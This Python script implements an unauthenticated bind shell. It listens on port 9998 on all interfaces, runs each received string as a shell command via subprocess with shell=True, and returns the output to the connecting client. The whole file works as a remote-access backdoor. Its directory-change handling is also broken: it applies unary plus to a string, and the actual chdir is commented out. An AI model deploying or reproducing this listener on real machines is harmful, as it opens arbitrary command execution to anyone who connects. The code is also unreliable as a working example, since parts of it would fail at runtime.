import socket
import sys
import threading 
from queue import Queue
import os
import subprocess
import threading

host = ""
port = 9998


def create_socket():
    try:
        global s
        s = socket.socket()


    except socket.error as msg:
        print("Socket creation error"+ str(msg))


def bind_socket():
    global s
    try:
        print("Binding the port " + str(port))
        s.bind((host,port))
        print("Listesning...")
        s.listen(5)
    
    except socket.error as msg:
        print("Socket binding error"+ str(msg) +'\n' + "retrying..")
        bind_socket()


# def socket_accept():
#     conn,addres = s.accept()
#     print("connection estableshed. IP: "+addres[0] + ", port: "+str(addres[1]))
#     receive_command(conn)
#     #send_command(conn)
#     conn.close()

def receive_command(conn):
    print(threading.current_thread().name)
    cwd = os.getcwd()
    while True:
        data = conn.recv(1024)
        if not data:
            print("clinet disconnected")
            conn.close()
            break
        if(data[:2].decode("utf-8") == "cd"):
            #os.chdir(data[3:].decode("utf-8"))
            cwd = +data[3:].decode("utf-8")
            print(cwd)
        if(len(data)>0):
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,  stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr=subprocess.PIPE,cwd=cwd)
            if(data[:2].decode("utf-8") == "cd"):
                output_str=""
            else:
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte,"utf-8")
            current_wd = cwd + "> "
            conn.send(str.encode(output_str + current_wd))
            #print(output_str)

def send_command(conn):
    while True:
        cmd = input()

        if(cmd=="q"):
            conn.close()
            s.close()
            sys.exit()

        if(len(str.encode(cmd)) > 0):
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

def socket_accept(client, connection):
    ip = connection[0]
    port = connection[1]
    print(f"THe new connection was made from IP: {ip}, and port: {port}!")
    receive_command(client)
    print(f"The client from ip: {ip}, and port: {port}, has gracefully diconnected!")
    client.close()


def main():
    create_socket()
    bind_socket()
    while True:
        try: 
            client, ip = s.accept()
            threading._start_new_thread(socket_accept,(client, ip))
        except KeyboardInterrupt:
            print(f"Gracefully shutting down the server!")
        except Exception as e:
            print(f"Well I did not anticipate this: {e}")
    #socket_accept()


main()